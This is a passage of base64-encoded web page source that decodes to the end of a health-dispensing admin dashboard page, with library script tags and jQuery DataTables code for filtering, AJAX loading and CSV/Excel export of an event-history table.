NjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvbW9tZW50Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0ZXJhbmdlcGlja2VyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvc2VsZWN0Mi5taW4uanMiPjwvc2NyaXB0PgoKICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvaHRtbDJjYW52YXMvMS40LjEvaHRtbDJjYW52YXMubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvanNwZGYvMS4zLjQvanNwZGYubWluLmpzIj48L3NjcmlwdD4KCiAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgdmFyIEJBU0VfQURNSU4gPSAnaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8nOwogICAgICAgICAgICB2YXIgdHlwZSA9ICdVc2VyVG90YWxFdmVudHMnOwogICAgICAgIDwvc2NyaXB0PgogICAgPC9ib2R5Pgo8L2h0bWw+CjxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZUV4cG9ydC5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQ+CiAgICB2YXIgc29ydEluZGV4ID0gODsKICAgIHZhciBzb3J0T3JkZXIgPSAiZGVzYyI7CiAgICB2YXIgY29sdW1uTGlzdENvdW50ZXIgPSAwOwogICAgaWYgKHR5cGUuaW5kZXhPZignTG9nJyk+MCkgewogICAgICAgIHNvcnRPcmRlciA9ICJkZXNjIjsKICAgIH0KICAgIHZhciBjb2x1bW5TdHIgPSBbeyJkYXRhIjoiZXZlbnQifSx7ImRhdGEiOiJvcmdhbml6YXRpb25faWQifSx7ImRhdGEiOiJkaXNwZW5zZXJfZ3JvdXBfaWQifSx7ImRhdGEiOiJkaXNwZW5zZXJfaWQifSx7ImRhdGEiOiJ1c2VyX2lkIn0seyJkYXRhIjoidGFnX2lkIn0seyJkYXRhIjoidGFnX3Jzc2kifSx7ImRhdGEiOiJpc19jb21wbGlhbnQifSx7ImRhdGEiOiJjcmVhdGVkX2F0In0sXTsKICAgIHZhciBkYXRhVGFibGVDb2x1bW5TdHIgPSBjb2x1bW5TdHI7CiAgICB2YXIgcGFnZUxlbmd0aCA9IDEwMDsKICAgIHZhciBzZWFyY2hpbmcgPSBmYWxzZTsKICAgIHZhciBhcHBseUZpbHRlciA9IDA7CiAgICB2YXIgc3RhcnREYXRlID0gIiI7CiAgICB2YXIgZW5kRGF0ZSA9ICIiOwogICAgdmFyIHVzZXJJZCA9ICIiOwogICAgdmFyIGZpbHRlckRpc3BlbnNlcklkID0gIiI7CiAgICB2YXIgZmlsdGVyVGFnSWQgPSAiIjsKICAgIHZhciBmaWx0ZXJEaXNwZW5zZXJHcm91cElkID0gIiI7CiAgICB2YXIgZmlsdGVyVXNlclR5cGVJZCA9ICIiOwogICAgdmFyIGZpbHRlck9yZ2FuaXphdGlvbklkID0gIiI7CiAgICB2YXIgZmlsdGVyQmF0dGVyeVN0YXR1cyA9ICIiOwogICAgdmFyIGZpbHRlckxpcXVpZExldmVsID0gIiI7CiAgICB2YXIgZmlsdGVyRmllbGQgPSAiIjsKICAgIHZhciBiSW5mbyA9ICIxIjsKICAgIHZhciBzaG93RmlsdGVyT3B0aW9ucyA9ICIiOwogICAgdmFyIGNvbHVtbnNMaXN0ID0gW107CiAgICB2YXIgY29sdW1uRGVmcyA9ICIiOwogICAgaWYgKHR5cGUgPT0gJ1VzZXInKSB7CiAgICAgICAgY29sdW1uRGVmcyA9IFt7CiAgICAgICAgICAgICAgICB0YXJnZXRzOiBbOV0sCiAgICAgICAgICAgICAgICAiY2xhc3NOYW1lIjogInRhYmxlRWRpdGFibGUgZC1mbGV4IHByLTMgIgogICAgICAgICAgICB9XTsKICAgIH0KICAgIGZvciAobGV0IGk9Y29sdW1uTGlzdENvdW50ZXI7IGk8Y29sdW1uU3RyLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgY29sdW1uc0xpc3QucHVzaChpKTsKICAgIH0KCiAgICB2YXIgZWRpdFBlcm1pc3Npb24gPSBmYWxzZTsKICAgIHZhciBkYXRhdGFibGUgPSBudWxsOwoKICAgIHZhciB1c2VDb29raWUgPSAiMSI7CiAgICB2YXIgY29va2llTmFtZSA9IHR5cGU7CiAgICB2YXIgYWpheFVybCA9ICJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlIjsKICAgIHZhciByZXZlcnNlQ29uZGl0aW9uQWRkaXRpb25GaWx0ZXIgPSBbJ1Nhbml0aXphdGlvbnMnLCAnTWlzc2VkT3Bwb3J0dW5pdGllcycsICdDb21wbGlhbnRFdmVudHMnXTsKICAgIGxldCBhZGRpdGlvbmFsRmlsdGVyVGV4dCA9ICcnOwogICAgbGV0IGRhdGVSYW5nZUZpbHRlcnMgPSBbJ2NyZWF0ZWRfYXQnLCAnY2hhbmdlZF9hdCcsICdyZXF1ZXN0ZWRfYXQnLCAndXBkYXRlZF9hdCcsICd3aWZpX2FjdGl2YXRpb25fZGF0ZScsICdsYXN0X2xpcXVpZF9yZWZpbGxfZGF0ZScsICdzYW5pdGl6ZWRfYXQnLCAnbGFzdF91cGRhdGVkX2F0JywgJ2FjdGl2aXR5X2RhdGUnLCAnbW9kaWZpZWRfYXQnXTsKICAgIGxldCBzZXREYXRlUmFuZ2VGaWx0ZXJzID0ge307CiAgICBsZXQgYWRkaXRpb25hbEZpbHRlck9wdGlvbiA9IHsnU2FuaXRpemF0aW9ucyc6J2ZhbHNlJywgJ1N0YWZmUGVyZm9ybWFuY2UnOid0cnVlJywgJ0Rpc3BlbnNlcic6J3RydWUnLCAnVGFnJzondHJ1ZScsICdVc2VyJzondHJ1ZScsICdDb21wbGlhbnRFdmVudHMnOidmYWxzZScsICdNaXNzZWRPcHBvcnR1bml0aWVzJzonZmFsc2UnfTsKICAgIGxldCB0ZW1wRmlsdGVyT3B0aW9ucyA9IHt9OwogICAgbGV0IGlubGluZUVkaXRpbmcgPSAiIjsKICAgIGxldCBmaXhlZENvbHVtbk5vcyA9IDA7CiAgICBsZXQgY29sUmVvcmRlckZpeGVkQ29scyA9IDA7CiAgICBpZiAodHlwZSA9PSAnRGlzcGVuc2VyJykgewogICAgICAgIGZpeGVkQ29sdW1uTm9zID0gMjsKICAgICAgICBjb2xSZW9yZGVyRml4ZWRDb2xzID0gMjsKICAgIH0gZWxzZSBpZiAodHlwZSA9PSAnRGlzcGVuc2VyR3JvdXAnIHx8IHR5cGUgPT0gJ1RhZycgfHwgdHlwZSA9PSAnVXNlcicpIHsKICAgICAgICBjb2xSZW9yZGVyRml4ZWRDb2xzID0gMTsKICAgIH0KCiAgICBpZiAodXNlQ29va2llKSB7CiAgICAgICAgdmFyIGNvb2tpZVVybCA9IGdldENvb2tpZShjb29raWVOYW1lKTsKICAgICAgICBpZiAodHlwZW9mIGNvb2tpZVVybCAhPT0gJ3VuZGVmaW5lZCcgJiYgY29va2llVXJsKSB7CiAgICAgICAgICAgIGFqYXhVcmwgPSBjb29raWVVcmw7CiAgICAgICAgfQogICAgICAgIHNldENvb2tpZShjb29raWVOYW1lLCBhamF4VXJsLCAzMCk7CgogICAgICAgIGlmIChhamF4VXJsLmluY2x1ZGVzKCJmaWx0ZXIiKSkgewogICAgICAgICAgICB2YXIgcGFyYW1zID0gYWpheFVybC5zcGxpdCgnPycpOwogICAgICAgICAgICBpZiAocGFyYW1zLmxlbmd0aCA+IDEpIHsKICAgICAgICAgICAgICAgIHBhcmFtcyA9IHBhcmFtc1sxXS5zcGxpdCgnJicpOwogICAgICAgICAgICAgICAgaWYgKHBhcmFtcy5pbmNsdWRlcygiZmlsdGVyPXRydWUiKSkgewogICAgICAgICAgICAgICAgICAgIHNob3dGaWx0ZXJzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPHBhcmFtcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgdmFyIHBhcmFtID0gcGFyYW1zW2ldLnNwbGl0KCc9Jyk7CiAgICAgICAgICAgICAgICBpZiAocGFyYW0ubGVuZ3RoID4gMSkgewogICAgICAgICAgICAgICAgICAgIGlmICgkKCcjJytwYXJhbVswXSkubGVuZ3RoID4gMCAmJiBwYXJhbVsxXS5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkucHJvcCgndHlwZScpID09ICd0ZXh0JykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGVSYW5nZUZpbHRlcnMuaW5jbHVkZXMocGFyYW1bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1bMV0gPSBwYXJhbVsxXS5yZXBsYWNlQWxsKCcrJywgJyAnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkudmFsKHBhcmFtWzFdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXREYXRlUmFuZ2VGaWx0ZXJzW3BhcmFtWzBdXSA9IHBhcmFtWzFdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkudmFsKHBhcmFtWzFdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJhbVswXSA9PSAnYWRkaXRpb25hbEZpbHRlcicgJiYgcGFyYW1bMV0gPT0gJ2ZhbHNlJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLnByb3AoJ2NoZWNrZWQnLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkucHJvcCgndHlwZScpID09ICdzZWxlY3QtbXVsdGlwbGUnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wRmlsdGVyT3B0aW9ucyA9IHBhcmFtWzFdLnNwbGl0KCcsJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkLmVhY2godGVtcEZpbHRlck9wdGlvbnMsIGZ1bmN0aW9uKGtleSwgdmFsdWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSsnIG9wdGlvblt2YWx1ZT0iJyt2YWx1ZSsnIl0nKS5hdHRyKCJzZWxlY3RlZCIsIHRydWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSsnIG9wdGlvblt2YWx1ZT0iJytwYXJhbVsxXSsnIl0nKS5hdHRyKCJzZWxlY3RlZCIsIHRydWUpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmIChyZXZlcnNlQ29uZGl0aW9uQWRkaXRpb25GaWx0ZXIuaW5jbHVkZXModHlwZSkpIHsKICAgICAgICAgICAgJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLnByb3AoJ2NoZWNrZWQnLCB0cnVlKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKCF1c2VDb29raWUgJiYgcmV2ZXJzZUNvbmRpdGlvbkFkZGl0aW9uRmlsdGVyLmluY2x1ZGVzKHR5cGUpKSB7CiAgICAgICAgJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLnByb3AoJ2NoZWNrZWQnLCB0cnVlKTsKICAgIH0KCiAgICAkKGRvY3VtZW50KS5yZWFkeShmdW5jdGlvbigpIHsKICAgICAgICBpZiAoISQuaXNFbXB0eU9iamVjdChzZXREYXRlUmFuZ2VGaWx0ZXJzKSkgewogICAgICAgICAgICBmb3IgKHZhciBrZXkgaW4gc2V0RGF0ZVJhbmdlRmlsdGVycykgewogICAgICAgICAgICAgICAgJCgnI2ZpbHRlckZvcm0gIycra2V5KS52YWwoc2V0RGF0ZVJhbmdlRmlsdGVyc1trZXldKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoYXBwbHlGaWx0ZXIpIHsKICAgICAgICAgICAgdmFyIGJhc2VVcmwgPSAiaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZSZmaWx0ZXI9dHJ1ZSI7CiAgICAgICAgICAgIGlmIChzdGFydERhdGUpIHsKICAgICAgICAgICAgICAgICQoJyMnK2ZpbHRlckZpZWxkKS52YWwoc3RhcnREYXRlICsgJyAtICcgKyBlbmREYXRlKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiYiK2ZpbHRlckZpZWxkKyI9IitzdGFydERhdGUgKyAnIC0gJyArIGVuZERhdGU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGZpbHRlck9yZ2FuaXphdGlvbklkKSB7CiAgICAgICAgICAgICAgICAkKCcjb3JnYW5pemF0aW9uX2lkJykudmFsKGZpbHRlck9yZ2FuaXphdGlvbklkKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZvcmdhbml6YXRpb25faWQ9IitmaWx0ZXJPcmdhbml6YXRpb25JZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAodXNlcklkKSB7CiAgICAgICAgICAgICAgICAkKCcjJytmaWx0ZXJGaWVsZCkudmFsKHVzZXJJZCkudHJpZ2dlcignY2hhbmdlJyk7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICImIitmaWx0ZXJGaWVsZCsiPSIrdXNlcklkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJVc2VyVHlwZUlkKSB7CiAgICAgICAgICAgICAgICAkKCcjcm9sZV9pZCcpLnZhbChmaWx0ZXJVc2VyVHlwZUlkKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZyb2xlX2lkPSIrZmlsdGVyVXNlclR5cGVJZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZmlsdGVyRGlzcGVuc2VySWQpIHsKICAgICAgICAgICAgICAgICQoJyNkaXNwZW5zZXJfaWQnKS52YWwoZmlsdGVyRGlzcGVuc2VySWQpLnRyaWdnZXIoJ2NoYW5nZScpOwogICAgICAgICAgICAgICAgYmFzZVVybCArPSAiJmRpc3BlbnNlcl9pZD0iK2ZpbHRlckRpc3BlbnNlcklkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJUYWdJZCkgewogICAgICAgICAgICAgICAgJCgnI3RhZ19pZCcpLnZhbChmaWx0ZXJUYWdJZCkudHJpZ2dlcignY2hhbmdlJyk7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICImdGFnX2lkPSIrZmlsdGVyVGFnSWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGZpbHRlckRpc3BlbnNlckdyb3VwSWQpIHsKICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXsKICAgICAgICAgICAgICAgICAgICAkKCcjZGlzcGVuc2VyX2dyb3VwX2lkJykudmFsKGZpbHRlckRpc3BlbnNlckdyb3VwSWQpLnRyaWdnZXIoJ2NoYW5nZScpOwogICAgICAgICAgICAgICAgfSwgNTAwKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZkaXNwZW5zZXJfZ3JvdXBfaWQ9IitmaWx0ZXJEaXNwZW5zZXJHcm91cElkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJCYXR0ZXJ5U3RhdHVzKSB7CiAgICAgICAgICAgICAgICAkKCcjYmF0dGVyeV9zdGF0dXMnKS52YWwoZmlsdGVyQmF0dGVyeVN0YXR1cykudHJpZ2dlcignY2hhbmdlJyk7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICImYmF0dGVyeV9zdGF0dXM9IitmaWx0ZXJCYXR0ZXJ5U3RhdHVzOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJMaXF1aWRMZXZlbCkgewogICAgICAgICAgICAgICAgJCgnI3Nhbml0aXphdGlvbl9jb3VudGVyJykudmFsKGZpbHRlckxpcXVpZExldmVsKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZzYW5pdGl6YXRpb25fY291bnRlcj0iK2ZpbHRlckxpcXVpZExldmVsOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCAmJiB0eXBlICE9ICdEaXNwZW5zZXJTdGF0dXMnKSB7CiAgICAgICAgICAgICAgICBpZiAoJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLmlzKCI6Y2hlY2tlZCIpKSB7CiAgICAgICAgICAgICAgICAgICAgYmFzZVVybCArPSAnJmFkZGl0aW9uYWxGaWx0ZXI9ZmFsc2UnOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICcmYWRkaXRpb25hbEZpbHRlcj10cnVlJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBhamF4VXJsID0gYmFzZVVybDsKICAgICAgICB9CgogICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCAmJiAkKCcjYXBwbHlBZGRpdGlvbmFsRmlsdGVyJykuaXMoIjpjaGVja2VkIikgJiYgYWpheFVybC5pbmRleE9mKCdhZGRpdGlvbmFsRmlsdGVyJykgPT09IC0xKSB7CiAgICAgICAgICAgIGFqYXhVcmwgKz0gJyZhZGRpdGlvbmFsRmlsdGVyPScrYWRkaXRpb25hbEZpbHRlck9wdGlvblt0eXBlXTsKICAgICAgICB9CiAgICAgICAgZGF0YXRhYmxlID0gJCgnI3JlY29yZHMnKS5EYXRhVGFibGUoewogICAgICAgICAgICAicHJvY2Vzc2luZyI6IHRydWUsCiAgICAgICAgICAgICJzZXJ2ZXJTaWRlIjogdHJ1ZSwKICAgICAgICAgICAgInNjcm9sbFgiOiB0cnVlLAogICAgICAgICAgICAib3JkZXIiOiBbWyBzb3J0SW5kZXgsIHNvcnRPcmRlciBdXSwKICAgICAgICAgICAgImFqYXgiOiB7CiAgICAgICAgICAgICAgICAidXJsIjogYWpheFVybCwKICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICByZWRpcmVjdFBhZ2UoQkFTRV9BRE1JTik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJjb2x1bW5zIjogY29sdW1uU3RyLAogICAgICAgICAgICAiYkluZm8iOiBmYWxzZSwKICAgICAgICAgICAgInNlYXJjaGluZyI6IHNlYXJjaGluZywKICAgICAgICAgICAgInBhZ2VMZW5ndGgiOiBwYWdlTGVuZ3RoLAogICAgICAgICAgICAibGFuZ3VhZ2UiOiB7CiAgICAgICAgICAgICAgICAic1plcm9SZWNvcmRzIjogIk5vIHJlY29yZHMgZm91bmQiLAogICAgICAgICAgICAgICAgInByb2Nlc3NpbmciOiAiPGkgY2xhc3M9XCJmYSBmYS1zcGlubmVyIGZhLXNwaW4gZmEtMnggZmEtZndcIiBzdHlsZT1cImNvbG9yOiMzNDNhNDBcIj48L2k+PHNwYW4gY2xhc3M9XCJzci1vbmx5XCI+TG9hZGluZy4ubi48L3NwYW4+IiwKICAgICAgICAgICAgICAgICJsZW5ndGhNZW51IjogIkl0ZW1zIHBlciBwYWdlOiBfTUVOVV8gIgogICAgICAgICAgICB9LAogICAgICAgICAgICAiY29sdW1uRGVmcyI6IGNvbHVtbkRlZnMsCiAgICAgICAgICAgICJwYWdpbmdUeXBlIjogImlucHV0IiwKICAgICAgICAgICAgLy9kb206ICdmbHJ0aXAnLAogICAgICAgICAgICBkb206ICc8InRvcCJmaWxwPnJ0PCJib3R0b20iaWxwPjwiY2xlYXIiPicsCiAgICAgICAgICAgIGZpeGVkQ29sdW1uczogewogICAgICAgICAgICAgICAgbGVmdDogZml4ZWRDb2x1bW5Ob3MKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYnV0dG9uczogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGV4dGVuZDogJ2NzdicsCiAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICdNaXJhZG9yIEluc2lnaHRzIEV2ZW50IEhpc3RvcnknLAogICAgICAgICAgICAgICAgICAgIGFjdGlvbjogbmV3RXhwb3J0QWN0aW9uLAogICAgICAgICAgICAgICAgICAgIGV4cG9ydE9wdGlvbnM6IHsKICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uczogY29sdW1uc0xpc3QKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGV4dGVuZDogJ2V4Y2VsJywKICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ01pcmFkb3IgSW5zaWdodHMgRXZlbnQgSGlzdG9yeScsCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uOiBuZXdFeHBvcnRBY3Rpb24sCiAgICAgICAgICAgICAgICAgICAgZXhwb3J0T3B0aW9uczogewogICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5zOiBjb2x1bW5zTGlzdAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgY3VzdG9taXplRGF0YTogZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaT0wOyBpPGRhdGEuYm9keS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaj0wOyBqPGRhdGEuYm9keVtpXS5sZW5ndGg7IGorKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuYm9keVtpXVtqXSA9ICdcdTIwMEMnICsgZGF0YS5ib2R5W2ldW2pdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAkJCQkJCiAgICAgICAgICAgIGluaXRDb21wbGV0ZTogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgZGF0YXRhYmxlLmJ1dHRvbnMoKS5jb250YWluZXIoKS5hcHBlbmRUbyggJCgnI2V4cG9ydCcpICk7CiAgICAgICAgICAgICAgICBpZiAoaW5saW5lRWRpdGluZykgewogICAgICAgICAgICAgICAgICAgICQoJy5kYXRhVGFibGVzX3Njcm9sbEhlYWQgdGgnKS5yZW1vdmVDbGFzcygndGFibGVFZGl0YWJsZSBkLWZsZXgnKTsKICAgICAgICAgICAgICAgICAgICAkKCIuZGF0YVRhYmxlIikuY3NzKCJ0YWJsZS1sYXlvdXQiLCAiZml4ZWQiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3RhdGVMb2FkUGFyYW1zOiBmdW5jdGlvbiAoc2V0dGluZ3MsIGRhdGEpIHsKICAgICAgICAgICAgICAgIGxldCByZWZyZXNoUGFnZUxlbmd0aCA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ3JlZnJlc2hQYWdlTGVuZ3RoJyk7CiAgICAgICAgICAgICAgICBpZiAoIXJlZnJlc2hQYWdlTGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2VMZW5ndGggPSBbXTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2VMZW5ndGggPSBKU09OLnBhcnNlKHJlZnJlc2hQYWdlTGVuZ3RoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChkYXRhLmxlbmd0aCAhPSBwYWdlTGVuZ3RoICYmIHJlZnJlc2hQYWdlTGVuZ3RoICYmICFyZWZyZXNoUGFnZUxlbmd0aC5pbmNsdWRlcyh0eXBlKSkgewogICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlTGVuZ3RoLnB1c2godHlwZSk7CiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgncmVmcmVzaFBhZ2VMZW5ndGgnLCBKU09OLnN0cmluZ2lmeShyZWZyZXNoUGFnZUxlbmd0aCkpOwogICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBkYXRhLmxlbmd0aDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29sUmVvcmRlcjogewogICAgICAgICAgICAgICAgZml4ZWRDb2x1bW5zTGVmdDogY29sUmVvcmRlckZpeGVkQ29scywKICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3RhdGVTYXZlOiB0cnVlCiAgICAgICAgfSk7CgogICAgICAgIGlmICgkKCcjcmVjb3Jkc193cmFwcGVyJykubGVuZ3RoICYmIHR5cGUgPT0gJ0Rpc3BlbnNlcicpIHsKICAgICAgICAgICAgJCgnI3JlY29yZHNfd3JhcHBlcicpLnByZXBlbmQoJzxkaXYgY2xhc3M9InJvdyBtLTAgbWItMyBjb2xvci1kYXJrLWdyZXkiPjxzdHJvbmc+IlN0cm9uZyIgZm9yIEdyZWVuLCAiV2VhayIgZm9yIFllbGxvdywgYW5kICJDcml0aWNhbCIgZm9yIFJlZDwvc3Ryb25nPjwvZGl2PicpOwogICAgICAgIH0KICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgICAgICBkYXRhdGFibGUub24oJ2NvbHVtbi1yZW9yZGVyJywgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIHZhciBuZXdDb2xPcmRlciA9IFtdOwogICAgICAgICAgICBsZXQgbmV3Q29sdW1uU3RyID0gW107CiAgICAgICAgICAgIG5ld0NvbHVtblN0ci5wdXNoKGRhdGFUYWJsZUNvbHVtblN0clswXSk7CiAgICAgICAgICAgIHZhciBjb2xSZW9yZGVyID0gZGF0YXRhYmxlLmNvbFJlb3JkZXIub3JkZXIoKTsKICAgICAgICAgICAgJC5lYWNoKGNvbFJlb3JkZXIsIGZ1bmN0aW9uKGtleSwgdmFsdWUpIHsKICAgICAgICAgICAgICAgIGlmIChjb2x1bW5zTGlzdC5pbmNsdWRlcyh2YWx1ZSkgJiYgdmFsdWUgIT0gMCkgewogICAgICAgICAgICAgICAgICAgIG5ld0NvbE9yZGVyLnB1c2godmFsdWUpOwogICAgICAgICAgICAgICAgICAgIG5ld0NvbHVtblN0ci5wdXNoKGRhdGFUYWJsZUNvbHVtblN0clt2YWx1ZV0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgY29sdW1uU3RyID0gbmV3Q29sdW1uU3RyOwogICAgICAgICAgICAkKHRoaXMpLm9mZihldmVudCk7CiAgICAgICAgfSk7CiAgICAgICAgaWYgKGFwcGx5RmlsdGVyIHx8IChzaG93RmlsdGVyT3B0aW9ucyAmJiAkKCIjZmlsdGVycyIpLmlzKCI6dmlzaWJsZSIpID09IGZhbHNlKSkgewogICAgICAgICAgICBzaG93RmlsdGVycygpOwogICAgICAgIH0KCiAgICAgICAgJCgnI3JlY29yZHMgdGJvZHknKS5vbignbW91c2VlbnRlcicsICcudGFibGVFZGl0YWJsZScsIGZ1bmN0aW9uKCkgewogICAgI